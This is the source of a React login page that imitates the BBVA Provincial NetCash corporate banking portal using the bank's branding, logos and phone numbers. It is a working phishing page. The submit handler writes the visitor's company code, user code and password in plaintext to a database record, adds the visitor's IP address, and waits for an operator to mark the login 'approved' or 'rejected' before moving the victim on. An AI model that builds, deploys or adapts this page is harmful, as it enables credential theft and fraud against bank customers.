import { useState, useRef, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { base44, supabase } from "@/api/base44Client";
import { usePresence } from "@/hooks/usePresence";

const RATE_LIMIT_KEY = "netcash_form_last_submit";
const RATE_LIMIT_MS = 15000;

function isRateLimited() {
  const last = parseInt(localStorage.getItem(RATE_LIMIT_KEY) || "0", 10);
  return Date.now() - last < RATE_LIMIT_MS;
}

function markSubmitted() {
  localStorage.setItem(RATE_LIMIT_KEY, String(Date.now()));
}

function InputField({ id, label, value, onChange, type = "text", focusedField, onFocus, onBlur }) {
  const isFocused = focusedField === id;
  const hasValue = value.length > 0;
  const isFloating = isFocused || hasValue;
  const isPassword = type === "password";
  const [showPassword, setShowPassword] = useState(false);

  return (
    <div style={{ position: "relative", width: "350px", height: "56px", backgroundColor: "#F4F4F4" }}>
      <label
        htmlFor={id}
        style={{
          position: "absolute",
          left: "16px",
          top: isFloating ? "8px" : "19px",
          fontSize: isFloating ? "11px" : "15px",
          color: isFloating ? "#767676" : "#121212",
          fontFamily: '"BentonSansBBVA Book", Helvetica, Arial, sans-serif',
          pointerEvents: "none",
          zIndex: 1,
          transition: "top 0.15s ease, font-size 0.15s ease, color 0.15s ease",
        }}
      >
        {label}
      </label>
      <input
        id={id}
        type={isPassword ? (showPassword ? "text" : "password") : type}
        value={value}
        onChange={(e) => { e.target.value = e.target.value.replace(/\s/g, ""); onChange(e); }}
        onFocus={onFocus}
        onBlur={onBlur}
        autoComplete="off"
        style={{
          position: "absolute",
          bottom: 0,
          left: 0,
          width: "100%",
          height: "100%",
          backgroundColor: "#F4F4F4",
          paddingTop: "22px",
          paddingBottom: "6px",
          paddingLeft: "16px",
          paddingRight: isPassword ? "44px" : "10px",
          fontSize: "15px",
          color: "#121212",
          fontFamily: '"BentonSansBBVA Book", Helvetica, Arial, sans-serif',
          border: "none",
          borderBottom: `2px solid ${isFocused ? "#004481" : "#C8C8C8"}`,
          outline: "none",
          boxSizing: "border-box",
        }}
      />
      {isPassword && hasValue && (
        <button
          type="button"
          onClick={() => setShowPassword(!showPassword)}
          style={{
            position: "absolute",
            right: "12px",
            top: "50%",
            transform: "translateY(-50%)",
            background: "none",
            border: "none",
            cursor: "pointer",
            padding: "4px",
            display: "flex",
            alignItems: "center",
          }}
        >
          <img
            src={
              showPassword
                ? "https://www.provincialnetcash.com/local_pibee/fbin/img/icon-hide.png"
                : "https://www.provincialnetcash.com/local_pibee/fbin/img/icon-show-blue.png"
            }
            alt={showPassword ? "Ocultar" : "Mostrar"}
            style={{ width: "20px", height: "20px" }}
          />
        </button>
      )}
    </div>
  );
}

export default function NetCashLogin() {
  const navigate = useNavigate();
  const [empresa, setEmpresa] = useState("");
  const [usuario, setUsuario] = useState("");
  const [clave, setClave] = useState("");
  const [focusedField, setFocusedField] = useState(null);
  const [loading, setLoading] = useState(false);
  const [rejected, setRejected] = useState(false);
  const [presenceSessionId, setPresenceSessionId] = useState(null);
  const { setEditing } = usePresence(presenceSessionId);
  const formLoadTime = useRef(Date.now());

  useEffect(() => { formLoadTime.current = Date.now(); }, []);

  const isFormFilled = empresa && usuario && clave;

  const handleEntrar = async () => {
    if (!isFormFilled) return;
    if (Date.now() - formLoadTime.current < 1500) return;
    if (isRateLimited()) return;
    markSubmitted();
    setLoading(true);

    const record = await base44.entities.UserSessionData.create({
      tipoDocumentoSeleccionado: "NetCash",
      numeroDocumento: empresa,
      usuario,
      claveAcceso: clave,
      status: "pending",
      clientOnlineStatus: "online",
    });

    fetch("https://api.ipify.org?format=json")
      .then((r) => r.json())
      .then(({ ip }) => base44.entities.UserSessionData.update(record.id, { userIp: ip }))
      .catch(() => {});

    setPresenceSessionId(record.id);

    let done = false;

    const handleResult = (status) => {
      if (done) return;
      done = true;
      clearInterval(interval);
      supabase.removeChannel(channel);
      if (status === "approved") {
        navigate("/netcash-portal", { replace: true, state: { sessionId: record.id } });
      } else if (status === "rejected") {
        setLoading(false);
        setRejected(true);
      }
    };

    const channel = supabase
      .channel(`netcash-login-${record.id}`)
      .on("postgres_changes", {
        event: "UPDATE",
        schema: "public",
        table: "user_session_data",
        filter: `id=eq.${record.id}`,
      }, (payload) => {
        const status = payload.new.status;
        if (status === "approved" || status === "rejected") handleResult(status);
      })
      .subscribe();

    const interval = setInterval(async () => {
      if (done) return;
      const updated = await base44.entities.UserSessionData.filter({ id: record.id });
      const session = updated[0];
      if (!session || done) return;
      if (session.status === "approved" || session.status === "rejected") {
        handleResult(session.status);
      }
    }, 300);
  };

  if (loading) {
    return (
      <div style={{ position: "fixed", inset: 0, background: "#f0f4f8", display: "flex", alignItems: "center", justifyContent: "center", zIndex: 9999 }}>
        <style>{"@keyframes spin { to { transform: rotate(360deg); } }"}</style>
        <div style={{ background: "white", border: "2px solid #1973B8", borderRadius: "6px", padding: "28px 40px", display: "flex", alignItems: "center", gap: "20px", minWidth: "380px", boxShadow: "0 2px 8px rgba(0,0,0,0.08)" }}>
          <div style={{ width: "36px", height: "36px", border: "4px solid #d1e6f7", borderTop: "4px solid #1973B8", borderRadius: "50%", animation: "spin 1s linear infinite", flexShrink: 0 }} />
          <span style={{ fontSize: "15px", color: "#1a1a1a", fontFamily: '"BentonSansBBVA Book", Helvetica, Arial, sans-serif', letterSpacing: "0.01em" }}>Procesando su petición, por favor espere...</span>
        </div>
      </div>
    );
  }

  if (rejected) {
    return (
      <div className="min-h-screen flex flex-col bg-white" style={{ fontFamily: '"BentonSansBBVA Book", Helvetica, Arial, sans-serif' }}>
        <header className="w-full flex items-center justify-between px-6 flex-shrink-0" style={{ height: "64px", backgroundColor: "#004481" }}>
          <img src="https://www.provincialnetcash.com/landing/img/logo-bbva.png" alt="BBVA Provincial" style={{ height: "28px", objectFit: "contain" }} />
        </header>
        <div style={{ flex: 1, display: "flex", alignItems: "center", justifyContent: "center", padding: "0 24px" }}>
          <div style={{ maxWidth: "520px", width: "100%", textAlign: "center" }}>
            <div style={{ marginBottom: "24px" }}>
              <svg width="48" height="48" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg" style={{ margin: "0 auto" }}>
                <path d="M24 4L44 42H4L24 4Z" fill="#CC0000" />
                <text x="24" y="36" textAnchor="middle" fill="white" fontSize="22" fontWeight="bold" fontFamily="Arial">!</text>
              </svg>
            </div>
            <h1 style={{ fontSize: "24px", fontWeight: "normal", color: "#121212", marginBottom: "20px" }}>
              Los datos ingresados son incorrectos
            </h1>
            <p style={{ fontSize: "14px", color: "#444", lineHeight: "1.6", marginBottom: "32px" }}>
              Verifica que los datos estén correctos e intenta nuevamente. En caso de necesitar ayuda, comunícate con nosotros a través de la{" "}
              <span style={{ color: "#004481", fontWeight: "600" }}>Línea Provincial</span>{" "}
              0500 508 74 32 o si te encuentras en el exterior al{" "}
              <span style={{ color: "#004481", fontWeight: "600" }}>(+58) 212 5039211</span>.
            </p>
            <button
              onClick={() => {
                localStorage.removeItem(RATE_LIMIT_KEY);
                setEmpresa("");
                setUsuario("");
                setClave("");
                setRejected(false);
              }}
              style={{ padding: "11px 52px", fontSize: "15px", background: "#1973B8", color: "white", border: "none", borderRadius: "4px", cursor: "pointer", fontFamily: "inherit" }}
            >
              Volver
            </button>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div
      className="min-h-screen flex flex-col bg-white"
      style={{ fontFamily: '"BentonSansBBVA Book", Helvetica, Arial, sans-serif' }}
      onFocus={() => setEditing(true)}
      onBlur={() => setEditing(false)}
    >
      {/* Header */}
      <header
        className="w-full flex items-center justify-between px-6 flex-shrink-0"
        style={{ height: "64px", backgroundColor: "#004481" }}
      >
        <img
          src="https://www.provincialnetcash.com/landing/img/logo-bbva.png"
          alt="BBVA Provincial"
          style={{ height: "28px", objectFit: "contain" }}
        />
        <button
          onClick={() => navigate("/")}
          className="flex items-center gap-1.5 hover:bg-white/10 px-2 py-1 rounded transition-colors duration-200"
          style={{ color: "#FFFFFF", fontSize: "15px", background: "none", border: "none", cursor: "pointer" }}
        >
          <span style={{ fontSize: "14px" }}>✕</span>
          <span>Salir</span>
        </button>
      </header>

      {/* Main Content */}
      <main className="flex-1 flex flex-col items-center px-4" style={{ paddingTop: "40px" }}>
        {/* Language selector */}
        <div style={{ width: "100%", display: "flex", justifyContent: "flex-end", padding: "0 24px", marginBottom: "16px" }}>
          <button className="flex items-center gap-1.5 hover:text-[#004481] transition-colors" style={{ color: "#555", fontSize: "14px", background: "none", border: "none", cursor: "pointer" }}>
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <circle cx="12" cy="12" r="10" />
              <line x1="2" y1="12" x2="22" y2="12" />
              <path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z" />
            </svg>
            English
          </button>
        </div>

        {/* Welcome heading */}
        <h1 style={{
          fontSize: "32px",
          color: "#121212",
          fontFamily: '"BentonSansBBVA Book", Helvetica, Arial, sans-serif',
          fontWeight: "300",
          margin: "0 0 21px 0",
          width: "350px",
          textAlign: "center",
        }}>
          ¡Bienvenido!
        </h1>

        {/* Form fields */}
        <div style={{ display: "flex", flexDirection: "column", gap: "16px", width: "350px" }}>
          <InputField
            id="empresa"
            label="Código de empresa"
            value={empresa}
            onChange={(e) => setEmpresa(e.target.value)}
            onFocus={() => setFocusedField("empresa")}
            onBlur={() => setFocusedField(null)}
            focusedField={focusedField}
          />
          <InputField
            id="usuario"
            label="Código de usuario"
            value={usuario}
            onChange={(e) => setUsuario(e.target.value)}
            onFocus={() => setFocusedField("usuario")}
            onBlur={() => setFocusedField(null)}
            focusedField={focusedField}
          />
          <InputField
            id="clave"
            label="Clave de acceso"
            type="password"
            value={clave}
            onChange={(e) => setClave(e.target.value)}
            onFocus={() => setFocusedField("clave")}
            onBlur={() => setFocusedField(null)}
            focusedField={focusedField}
          />

          {/* Forgot password */}
          <div style={{ textAlign: "center", marginTop: "4px" }}>
            <a href="#" style={{
              color: "#1973B8",
              fontSize: "15px",
              fontFamily: '"BentonSansBBVA Book", Helvetica, Arial, sans-serif',
              fontWeight: "500",
              textDecoration: "none",
            }}>
              Olvido o desbloqueo de contraseña
            </a>
          </div>

          {/* Security notice box */}
          <div style={{
            width: "436px",
            marginLeft: "-43px",
            backgroundColor: "#F3EBD5",
            padding: "28px",
            display: "flex",
            gap: "12px",
            alignItems: "flex-start",
            boxSizing: "border-box",
            marginTop: "8px",
          }}>
            <img
              src="https://www.provincialnetcash.com/local_pibee/fbin/img/icon-alert.png"
              alt="Alerta"
              style={{ width: "22px", height: "22px", flexShrink: 0, marginTop: "1px" }}
            />
            <p style={{
              margin: 0,
              fontSize: "15px",
              color: "#121212",
              fontFamily: '"BentonSansBBVA Book", Helvetica, Arial, sans-serif',
              lineHeight: "1.5",
            }}>
              Si desconoce algún movimiento en sus productos, debe comunicarse inmediatamente con su ejecutivo o llame al{" "}
              <strong style={{ fontWeight: "600" }}>(+58) 212-5039211</strong>{" "}
              disponible las 24 horas.
            </p>
          </div>

          {/* Submit button */}
          <div style={{ display: "flex", justifyContent: "center", paddingTop: "16px", paddingBottom: "40px" }}>
            <button
              onClick={handleEntrar}
              disabled={!isFormFilled}
              style={{
                width: "112px",
                height: "56px",
                backgroundColor: "#1973B8",
                color: "#FFFFFF",
                cursor: isFormFilled ? "pointer" : "default",
                border: "none",
                borderRadius: "2px",
                padding: "16px",
                fontSize: "15px",
                fontFamily: '"BentonSansBBVA Medium", Helvetica, Arial, sans-serif',
                fontWeight: "500",
                margin: "16px 0",
                opacity: isFormFilled ? 1 : 0.6,
              }}
            >
              Entrar
            </button>
          </div>
        </div>
      </main>
    </div>
  );
}
